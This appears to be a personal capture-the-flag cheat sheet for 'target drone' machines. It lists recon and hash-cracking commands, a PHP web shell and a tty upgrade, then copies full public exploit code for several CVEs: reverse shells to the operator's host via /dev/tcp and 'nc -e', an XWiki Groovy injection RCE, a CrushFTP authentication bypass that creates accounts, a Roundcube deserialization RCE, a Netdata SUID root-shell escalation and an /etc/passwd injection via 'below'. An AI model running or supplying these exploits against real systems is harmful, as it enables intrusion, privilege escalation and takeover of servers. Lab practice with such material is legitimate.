# TDCVES
Target Drone CVE Summary

## base

port scan: ```nmap -T5 -Pn -sCTV {target ip}```

ip<->host: ```vim /etc/hosts```

dir scan: ```ffuf -w /usr/share/dirb/wordlists/common.txt -u http://example.com/FUZZ -recursion```

sub domain scan: ```ffuf -u 'http://example.com/' -H 'Host: FUZZ.example.com -w /usr/share/wfuzz/wordlist/general/medium.txt -fw 4```

hash: ```john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5```

ike: ```ike-scan -M -A <target_ip>```

git: ```git clone https://github.com/example/example.git```

sql: ```mysql -h localhost -P 3306 -u user -p```

Web Shell: ```<?php echo "<div>".system($_GET['cmd'])."</div>"; ?>```

升級tty: ```script /dev/null -qc /bin/bash```

sudo: 
```
ps auxww
ss -tuln
sudo -l
find / -type f -perm -4000 2>/dev/null
```
## link
* https://www.revshells.com/
* https://crackstation.net/
* https://www.base64decode.org/
* https://keydecryptor.com/decryption-tools/roundcube

## CVE
### CVE-2024-28397
https://github.com/Ghost-Overflow/CVE-2024-28397-command-execution-poc/blob/main/payload.js
```
nc -lvnp 9001
```
**payload.js**
```
let cmd = "bash -c \"sh -i >& /dev/tcp/{your IP}/9001 0>&1\""
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for (let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if (item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

// run the command and force UTF-8 string output
let proc = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true)
let out = proc.communicate()[0].decode("utf-8")

// return a plain string (JSON-safe)
"" + out
```

### CVE-2024-32019
https://github.com/T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC#
```
gcc -static payload.c -o nvme -Wall -Werror -Wpedantic
```
```
wget http://192.168.100.7:8000/CVE-2024-32019.sh
wget http://192.168.100.7:8000/nvme
sh CVE-2024-32019.sh
```
**CVE-2024-32019.sh**
```
#!/bin/bash

# Search for ndsudo SUID
ndsudo_path=$(find / -type f -name "ndsudo" -perm -4000 -print 2>/dev/null)

# Check it was found
if [ -z "$ndsudo_path" ]; then
    echo "[!] No SUID binary named ndsudo was found."
    exit 1
fi

echo "[+] ndsudo found at: $ndsudo_path"

# Check existence of ./nvme payload
if [ -f "./nvme" ]; then
    echo "[+] File 'nvme' found in the current directory."
    chmod +x ./nvme
    echo "[+] Execution permissions granted to ./nvme"
else
    echo "[!] The file 'nvme' was not found in the current directory."
    exit 1
fi

# Modify PATH and execute the SUID binary with nvme-list
echo "[+] Running ndsudo with modified PATH:"
PATH="$(pwd):$PATH" "$ndsudo_path" nvme-list
```
**payload.c**
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

### CVE-2025-24893
https://github.com/gunzf0x/CVE-2025-24893
```
nc -lvnp 9001
```
```
python3 CVE-2025-24893.py -t 'http://{target ip}:8080' -c 'busybox nc {your ip} 9001 -e /bin/bash'
```
**CVE-2025-24893.py**
```
#!/usr/bin/python3

import argparse
import urllib.parse
import requests
import sys

# Define color dictionary
color = {
    "NC": '\033[0m',
    "RED": '\033[91m',
    "GREEN": '\033[92m',
    "YELLOW": '\033[93m',
    "BLUE": '\033[94m',
    "MAGENTA": '\033[95m',
    "CYAN": '\033[96m',
    "WHITE": '\033[97m'
}


# Define some pretty characters
STAR: str = f"{color['YELLOW']}[{color['BLUE']}*{color['YELLOW']}]{color['NC']}"
WARNING_STR: str = f"{color['RED']}[{color['YELLOW']}!{color['RED']}]{color['NC']}"


# Ctrl+C
def signal_handler(sig, frame)->None:
    print(f"\n{WARNING_STR} {color['RED']}Ctrl+C! Exiting...{color['RESET']}")
    sys.exit(1)


def parse_arguments()->argparse.Namespace:
    """
    Get arguments from user
    """
    # Create an ArgumentParser object
    parser = argparse.ArgumentParser(description=f"{color['BLUE']}CVE-2025-24893{color['NC']} exploit by {color['RED']}gunzf0x{color['NC']}",
                                     epilog=f"""
{color['YELLOW']}Example usage:{color['NC']}
{color['GREEN']}python3 {sys.argv[0]} -t 'http://example.com:8080' -c 'ping -c1 10.10.10.10'{color['NC']}""",
                                     formatter_class=argparse.RawTextHelpFormatter)
    # Add arguments with flags
    parser.add_argument("-t", "--target", type=str, help="Target url. For example: 'http://example.com' or 'http://example.com:8080'", required=True)
    parser.add_argument("-c", "--command", type=str, help="System command to execute in the target machine", required=True)
    # Return the parsed arguments
    return parser.parse_args()


def check_url(original_url: str)->str:
    """
    Check if url provided is in correct format
    """
    if not original_url.startswith("http://") or not original_url.startswith("https://"):
        print(f"{WARNING_STR} protocol not found in url (HTTP or HTTPs). Assumming it is 'https' adding 'http://' string to url...")
        return 'http://' + original_url
    return original_url


def exploit(target: str, command: str)->None:
    """
    Exploit for CVE-2025-24893 attacking vulnerable endpoint
    """
    # Set target url
    print(f"{STAR} Attacking {color['CYAN']}{target}{color['NC']}")
    url_payload: str = f"{target[:-1] if target.endswith('/') else target}/xwiki/bin/get/Main/SolrSearch?media=rss&text="
    original_payload: str = f'}}}}{{{{async async=false}}}}{{{{groovy}}}}"{command}".execute(){{{{/groovy}}}}{{{{/async}}}}'
    encoded_payload: str  = urllib.parse.quote(original_payload)
    vulnerable_endpoint: str = f"{url_payload}{encoded_payload}"
    print(f"{STAR} Injecting the payload:\n{color['CYAN']}{vulnerable_endpoint}{color['NC']}")
    try:
        requests.get(vulnerable_endpoint, verify=False, timeout=15)
    except Exception as e:
        print(f"{WARNING_STR} {color['RED']}An error ocurred:\n{color['YELLOW']}{e}{color['NC']}")
        sys.exit(1)
    print(f"{STAR} {color['MAGENTA']}Command executed{color['NC']}")
    print("\n~Happy Hacking")

    

def main()->None:
    # Get arguments form user
    args: argparse.Namespace = parse_arguments()
    # Execute the exploit attacking the vulnerable endpoint
    exploit(args.target, args.command)


if __name__ == "__main__":
    main()
```

### CVE-2025-31161
https://github.com/Immersive-Labs-Sec/CVE-2025-31161

```
python cve-2025-31161.py --target_host ftp.example.com --port 80 --target_user crushadmin --new_user zero --password 123456
```
**cve-2025-31161.py**
```
# Copyright (C) 2025 Kev Breen,Ben McCarthy Immersive
# https://github.com/Immersive-Labs-Sec/CVE-2025-31161
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import requests
from argparse import ArgumentParser


def exploit(target_host, port, target_user, new_user, password):
    print("[+] Preparing Payloads")
    
    # First request details
    warm_up_url = f"http://{target_host}:{port}/WebInterface/function/"
    create_user_url = f"http://{target_host}:{port}/WebInterface/function/"


    headers = {
        "Cookie": "currentAuth=31If; CrushAuth=1744110584619_p38s3LvsGAfk4GvVu0vWtsEQEv31If",
        "Authorization": "AWS4-HMAC-SHA256 Credential=crushadmin/",
        "Connection": "close",
    }

    payload = {
        "command": "setUserItem",
        "data_action": "replace",
        "serverGroup": "MainUsers",
        "username": new_user,
        "user": f'<?xml version="1.0" encoding="UTF-8"?><user type="properties"><user_name>{new_user}</user_name><password>{password}</password><extra_vfs type="vector"></extra_vfs><version>1.0</version><root_dir>/</root_dir><userVersion>6</userVersion><max_logins>0</max_logins><site>(SITE_PASS)(SITE_DOT)(SITE_EMAILPASSWORD)(CONNECT)</site><created_by_username>{target_user}</created_by_username><created_by_email></created_by_email><created_time>1744120753370</created_time><password_history></password_history></user>',
        "xmlItem": "user",
        "vfs_items": '<?xml version="1.0" encoding="UTF-8"?><vfs type="vector"></vfs>',
        "permissions": '<?xml version="1.0" encoding="UTF-8"?><VFS type="properties"><item name="/">(read)(view)(resume)</item></VFS>',
        "c2f": "31If"
    }

    # Execute requests sequentially
    print("  [-] Warming up the target")
    # we jsut fire a request and let it time out. 
    try:
        warm_up_request = requests.get(warm_up_url, headers=headers, timeout=20)
        if warm_up_request.status_code == 200:
            print("  [-] Target is up and running")
    except requests.exceptions.ConnectionError:
        print("  [-] Request timed out, continuing with exploit")


    print("[+] Sending Account Create Request")
    create_user_request = requests.post(create_user_url, headers=headers, data=payload)
    if create_user_request.status_code != 200:
        print("  [-] Failed to send request")
        print("  [+] Status code:", create_user_request.status_code)
    if '<response_status>OK</response_status>' in create_user_request.text:
        print("  [!] User created successfully")



if __name__ == "__main__":
    parser = ArgumentParser(description="Exploit CVE-2025-31161 to create a new account")
    parser.add_argument("--target_host", help="Target host")
    parser.add_argument("--port", type=int, help="Target port", default=8080)
    parser.add_argument("--target_user", help="Target user", default="crushadmin")
    parser.add_argument("--new_user", help="New user to create", default="AuthBypassAccount")
    parser.add_argument("--password", help="Password for the new user", default="CorrectHorseBatteryStaple")

    args = parser.parse_args()

    if not args.target_host:
        print("  [-] Target host not specified")
        parser.print_help()
        exit(1)

    exploit(
        target_host=args.target_host,
        port=args.port,
        target_user=args.target_user,
        new_user=args.new_user,
        password=args.password
    )

    print(f"[+] Exploit Complete you can now login with\n   [*] Username: {args.new_user}\n   [*] Password: {args.password}.")
```
### CVE-2025-49113
https://github.com/hakaioffsec/CVE-2025-49113-exploit/tree/main
```
nc -lvnp 9001
```
```
php CVE-2025-49113.php http:// <url> <username> <password>  "bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'"
```
```
<?php
class Crypt_GPG_Engine
{
    public $_process = false;
    public $_gpgconf = '';
    public $_homedir = '';

    public function __construct($_gpgconf)
    {
        $_gpgconf = base64_encode($_gpgconf);
        $this->_gpgconf = "echo \"{$_gpgconf}\"|base64 -d|sh;#";
    }

    public function gadget()
    {
        return '|'. serialize($this) . ';';
    }
}

function checkVersion($baseUrl)
{
    echo "[*] Checking Roundcube version...\n";
    
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: Roundcube exploit CVE-2025-49113 - Hakai Security\r\n",
            'ignore_errors' => true,
        ],
    ]);

    $response = file_get_contents($baseUrl, false, $context);
    
    if ($response === FALSE) {
        echo "[-] Error: Failed to check version.\n";
        exit(1);
    }

    $vulnerableVersions = [
        '10500', '10501', '10502', '10503', '10504', '10505', '10506', '10507', '10508', '10509',
        '10600', '10601', '10602', '10603', '10604', '10605', '10606', '10607', '10608', '10609', '10610'
    ];

    preg_match('/"rcversion":(\d+)/', $response, $matches);
    
    if (empty($matches[1])) {
        echo "[-] Error: Could not detect Roundcube version.\n";
        exit(1);
    }

    $version = $matches[1];
    echo "[*] Detected Roundcube version: " . $version . "\n";

    if (in_array($version, $vulnerableVersions)) {
        echo "[+] Target is vulnerable!\n";
        return true;
    } else {
        echo "[-] Target is not vulnerable.\n";
        exit(1);
    }
}

function login($baseUrl, $user, $pass)
{
    // Configuration to capture session cookies
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: Roundcube exploit CVE-2025-49113 - Hakai Security\r\n",
            'ignore_errors' => true,
            // 'request_fulluri' => false, // necessary for HTTP proxies like Burp
            // 'proxy' => 'tcp://127.0.0.1:8080',
        ],
    ]);

    // Make a GET request to the initial page
    $response = file_get_contents($baseUrl, false, $context);

    if ($response === FALSE) {
        echo "Error: Failed to obtain the initial page.\n";
        exit(1);
    }

    // Extract the 'roundcube_sessid' cookie
    preg_match('/Set-Cookie: roundcube_sessid=([^;]+)/', implode("\n", $http_response_header), $matches);
    if (empty($matches[1])) {
        echo "Error: 'roundcube_sessid' cookie not found.\n";
        exit(1);
    }
    $sessionCookie = 'roundcube_sessid=' . $matches[1];

    // Extract the CSRF token from the JavaScript code
    preg_match('/"request_token":"([^"]+)"/', $response, $matches);
    if (empty($matches[1])) {
        echo "Error: CSRF token not found.\n";
        exit(1);
    }

    $csrfToken = $matches[1];

    $url = $baseUrl . '/?_task=login';

    $data = http_build_query([
        '_token'    => $csrfToken,
        '_task'     => 'login',
        '_action'   => 'login',
        '_timezone' => 'America/Sao_Paulo',
        '_url'      => '',
        '_user'     => $user,
        '_pass'     => $pass,
    ]);

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n" .
                        "Cookie: " . $sessionCookie . "\r\n",
            'method'  => 'POST',
            'content' => $data,
            'ignore_errors' => true,
            // 'request_fulluri' => true, // necessary for HTTP proxies like Burp
            // 'proxy' => 'tcp://127.0.0.1:8080',
        ],
    ];

    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === FALSE) {
        echo "Error: Failed to make the request.\n";
        exit(1);
    }

    // Check the HTTP status code
    $statusLine = $http_response_header[0];
    preg_match('{HTTP/\S*\s(\d{3})}', $statusLine, $match);
    $status = $match[1];

    if ($status == 401) {
        echo "Error: Incorrect credentials.\n";
        exit(1);
    } elseif ($status != 302) {
        echo "Error: Request failed with status code $status.\n";
        exit(1);
    }

    // Extract the last 'roundcube_sessauth' cookie from the login response, ignoring the cookie with value '-del-'
    preg_match_all('/Set-Cookie: roundcube_sessauth=([^;]+)/', implode("\n", $http_response_header), $matches);
    if (empty($matches[1])) {
        echo "Error: 'roundcube_sessauth' cookie not found.\n";
        exit(1);
    }
    $authCookie = 'roundcube_sessauth=' . end($matches[1]);

    // Extract the 'roundcube_sessid' cookie from the login response
    preg_match('/Set-Cookie: roundcube_sessid=([^;]+)/', implode("\n", $http_response_header), $matches);
    if (empty($matches[1])) {
        echo "Error: 'roundcube_sessid' cookie not found.\n";
        exit(1);
    }
    $sessionCookie = 'roundcube_sessid=' . $matches[1];

    echo "[+] Login successful!\n";

    return [
        'sessionCookie' => $sessionCookie,
        'authCookie' => $authCookie,
    ];
}

function uploadImage($baseUrl, $sessionCookie, $authCookie, $gadget)
{
    $uploadUrl = $baseUrl . '/?_task=settings&_framed=1&_remote=1&_from=edit-!xxx&_id=&_uploadid=upload1749190777535&_unlock=loading1749190777536&_action=upload';

    // Hardcoded PNG image in base64
    $base64Image = 'iVBORw0KGgoAAAANSUhEUgAAAIAAAABcCAYAAACmwr2fAAAAAXNSR0IArs4c6QAAAGxlWElmTU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAIdpAAQAAAABAAAATgAAAAAAAACQAAAAAQAAAJAAAAABAAKgAgAEAAAAAQAAAICgAwAEAAAAAQAAAFwAAAAAbqF/KQAAAAlwSFlzAAAWJQAAFiUBSVIk8AAAAWBJREFUeAHt1MEJACEAxMDzSvEn2H97CrYx2Q4Swo659vkaa+BnyQN/BgoAD6EACgA3gOP3AAWAG8Dxe4ACwA3g+D1AAeAGcPweoABwAzh+D1AAuAEcvwcoANwAjt8DFABuAMfvAQoAN4Dj9wAFgBvA8XuAAsAN4Pg9QAHgBnD8HqAAcAM4fg9QALgBHL8HKADcAI7fAxQAbgDH7wEKADeA4/cABYAbwPF7gALADeD4PUAB4AZw/B6gAHADOH4PUAC4ARy/BygA3ACO3wMUAG4Ax+8BCgA3gOP3AAWAG8Dxe4ACwA3g+D1AAeAGcPweoABwAzh+D1AAuAEcvwcoANwAjt8DFABuAMfvAQoAN4Dj9wAFgBvA8XuAAsAN4Pg9QAHgBnD8HqAAcAM4fg9QALgBHL8HKADcAI7fAxQAbgDH7wEKADeA4/cABYAbwPF7gALADeD4PUAB4AZw/B4AD+ACXpACLpoPsQQAAAAASUVORK5CYII=';

    // Decode the base64 image
    $fileContent = base64_decode($base64Image);
    if ($fileContent === FALSE) {
        echo "Error: Failed to decode the base64 image.\n";
        exit(1);
    }

    $boundary = uniqid();
    $data = "--" . $boundary . "\r\n" .
            "Content-Disposition: form-data; name=\"_file[]\"; filename=\"" . $gadget . "\"\r\n" .
            "Content-Type: image/png\r\n\r\n" .
            $fileContent . "\r\n" .
            "--" . $boundary . "--\r\n";

    $options = [
        'http' => [
            'header'  => "Content-type: multipart/form-data; boundary=" . $boundary . "\r\n" .
                        "Cookie: " . $sessionCookie . "; " . $authCookie . "\r\n",
            'method'  => 'POST',
            'content' => $data,
            'ignore_errors' => true,
            // 'request_fulluri' => true, // necessary for HTTP proxies like Burp
            // 'proxy' => 'tcp://127.0.0.1:8080',
        ],
    ];

    echo "[*] Exploiting...\n";
    
    $context  = stream_context_create($options);
    $result = file_get_contents($uploadUrl, false, $context);

    if ($result === FALSE) {
        echo "Error: Failed to send the file.\n";
        exit(1);
    }

    // Check the HTTP status code
    $statusLine = $http_response_header[0];
    preg_match('{HTTP/\S*\s(\d{3})}', $statusLine, $match);
    $status = $match[1];

    if ($status != 200) {
        echo "Error: File upload failed with status code $status.\n";
        exit(1);
    }

    echo "[+] Gadget uploaded successfully!\n";
}

function exploit($baseUrl, $user, $pass, $rceCommand)
{
    echo "[+] Starting exploit (CVE-2025-49113)...\n";
    
    // Check version before proceeding
    checkVersion($baseUrl);
    
    // Instantiate the Crypt_GPG_Engine class with the RCE command
    $gpgEngine = new Crypt_GPG_Engine($rceCommand);
    $gadget = $gpgEngine->gadget();

    // Escape double quotes in the gadget
    $gadget = str_replace('"', '\\"', $gadget);

    // Login and get session cookies
    $cookies = login($baseUrl, $user, $pass);

    // Upload the image with the gadget
    uploadImage($baseUrl, $cookies['sessionCookie'], $cookies['authCookie'], $gadget);
}

if ($argc !== 5) {
    echo "Usage: php CVE-2025-49113.php <url> <username> <password> <command>\n";
    exit(1);
}

$baseUrl = $argv[1];
$user = $argv[2];
$pass = $argv[3];
$rceCommand = $argv[4];

exploit($baseUrl, $user, $pass, $rceCommand);
```

### CVE-2025-27591
https://github.com/BridgerAlderson/CVE-2025-27591-PoC
```
#!/usr/bin/env python3
import os
import subprocess
import sys
import pty

BINARY = "/usr/bin/below"
LOG_DIR = "/var/log/below"
TARGET_LOG = f"{LOG_DIR}/error_root.log"
TMP_PAYLOAD = "/tmp/attacker"

MALICIOUS_PASSWD_LINE = "attacker::0:0:attacker:/root:/bin/bash\n"

def check_world_writable(path):
    st = os.stat(path)
    return bool(st.st_mode & 0o002)

def is_symlink(path):
    return os.path.islink(path)

def run_cmd(cmd, show_output=True):
    if show_output:
        print(f"[+] Running: {cmd}")
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        if show_output:
            print(f"[-] Command failed: {e.output}")
        return None

def check_vulnerability():
    print("[*] Checking for CVE-2025-27591 vulnerability...")

    if not os.path.exists(LOG_DIR):
        print(f"[-] Log directory {LOG_DIR} does not exist.")
        return False

    if not check_world_writable(LOG_DIR):
        print(f"[-] {LOG_DIR} is not world-writable.")
        return False
    print(f"[+] {LOG_DIR} is world-writable.")

    if os.path.exists(TARGET_LOG):
        if is_symlink(TARGET_LOG):
            print(f"[+] {TARGET_LOG} is already a symlink. Looks exploitable.")
            return True
        else:
            print(f"[!] {TARGET_LOG} is a regular file. Removing it...")
            os.remove(TARGET_LOG)

    try:
        os.symlink("/etc/passwd", TARGET_LOG)
        print(f"[+] Symlink created: {TARGET_LOG} -> /etc/passwd")
        os.remove(TARGET_LOG)  
        return True
    except Exception as e:
        print(f"[-] Failed to create symlink: {e}")
        return False

def exploit():
    print("[*] Starting exploitation...")

    with open(TMP_PAYLOAD, "w") as f:
        f.write(MALICIOUS_PASSWD_LINE)
    print(f"[+] Wrote malicious passwd line to {TMP_PAYLOAD}")

    if os.path.exists(TARGET_LOG):
        os.remove(TARGET_LOG)
    os.symlink("/etc/passwd", TARGET_LOG)
    print(f"[+] Symlink set: {TARGET_LOG} -> /etc/passwd")

    print("[*] Executing 'below record' as root to trigger logging...")
    try:
        subprocess.run(["sudo", BINARY, "record"], timeout=40)
        print("[+] 'below record' executed.")
    except subprocess.TimeoutExpired:
        print("[-] 'below record' timed out (may still have written to the file).")
    except Exception as e:
        print(f"[-] Failed to execute 'below': {e}")

    print("[*] Appending payload into /etc/passwd via symlink...")
    try:
        with open(TARGET_LOG, "a") as f:
            f.write(MALICIOUS_PASSWD_LINE)
        print("[+] Payload appended successfully.")
    except Exception as e:
        print(f"[-] Failed to append payload: {e}")

    print("[*] Attempting to switch to root shell via 'su attacker'...")
    try:
        pty.spawn(["su", "attacker"])
    except Exception as e:
        print(f"[-] Failed to spawn shell: {e}")
        return False

def main():
    if not check_vulnerability():
        print("[-] Target does not appear vulnerable.")
        sys.exit(1)
    print("[+] Target is vulnerable.")

    if not exploit():
        print("[-] Exploitation failed.")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

### CVE-2025-32462
https://github.com/cyberpoul/CVE-2025-32462-POC/tree/main
